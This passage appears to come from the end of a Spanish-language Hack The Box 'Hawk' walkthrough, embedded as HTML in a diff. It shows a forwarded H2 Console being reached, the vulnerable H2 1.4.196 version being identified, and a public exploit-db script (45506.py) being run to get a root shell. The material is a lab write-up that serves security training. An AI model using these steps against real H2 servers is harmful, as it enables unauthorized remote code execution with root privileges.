+ssh       332076   root    4u  IPv6 790371      0t0  TCP localhost:4646 <span class="o">(</span>LISTEN<span class="o">)</span>
+ssh       332076   root    5u  IPv4 790372      0t0  TCP localhost:4646 <span class="o">(</span>LISTEN<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Y ahora si ingresamos a la siguiente dirección URL, podemos ver el panel de administración de <strong>H2 Console</strong>:</p>
+
+<ul>
+  <li>http://127.0.0.1:4646/</li>
+</ul>
+
+<p><img src="/assets/images/htb-hawk/hawk_lpf.jpg" alt="" /></p>
+
+<p>Dentro de este panel, modifcamos el siguiente valor y la damos en <strong>Conectar</strong>:</p>
+<ul>
+  <li>URL JDBC: jdbc:h2:~/k4mishell</li>
+</ul>
+
+<p>![[hawk_k4mishell.jpg]]</p>
+
+<p>Vemos que se usa la versión <code class="language-plaintext highlighter-rouge">H2 1.4.196</code>, por lo que procedemos a buscar un posible exploit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit H2 1.4.196
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+H2 Database 1.4.196 - Remote Code Execution                                                    | java/webapps/45506.py
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+Papers: No Results
+</code></pre></div></div>
+
+<p>Vemos un posible exploit a utilizar hecho en <code class="language-plaintext highlighter-rouge">python</code>, por lo que lo descargar y procedemos a ejecutarlo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit <span class="nt">-m</span> java/webapps/45506.py
+  Exploit: H2 Database 1.4.196 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/45506
+     Path: /usr/share/exploitdb/exploits/java/webapps/45506.py
+File Type: Python script, UTF-8 Unicode text executable, with CRLF line terminators
+
+Copied to: /home/k4miyo/Documentos/HTB/Hawk/exploits/45506.py
+
+
+❯ <span class="nb">mv </span>45506.py h2_console.py
+❯ python3 h2_console.py
+usage: h2_console.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="nt">-H</span> 127.0.0.1:8082 <span class="o">[</span><span class="nt">-d</span> jdbc:h2:~/emptydb-N5s2o]
+h2_console.py: error: the following arguments are required: <span class="nt">-H</span>/--host
+</code></pre></div></div>
+
+<p>Para su ejecución tenemos que indicarle el host y el valor <strong>jdbc</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 h2_console.py <span class="nt">-H</span> 127.0.0.1:4646 <span class="nt">-d</span> jdbc:h2:~/k4mi
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to create database
+<span class="o">[</span>+] Created database and logged <span class="k">in</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage 1
+<span class="o">[</span>+] Shell succeeded - ^c or quit to <span class="nb">exit
+</span>h2-shell<span class="nv">$ </span><span class="nb">whoami
+</span>root
+
+h2-shell<span class="err">$</span>
+</code></pre></div></div>
+
+<p>A este punto ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">PHP</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-09-16T00:00:00-05:00">September 16, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-optimum/" class="pagination--pager" title="Hack The Box Optimum
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
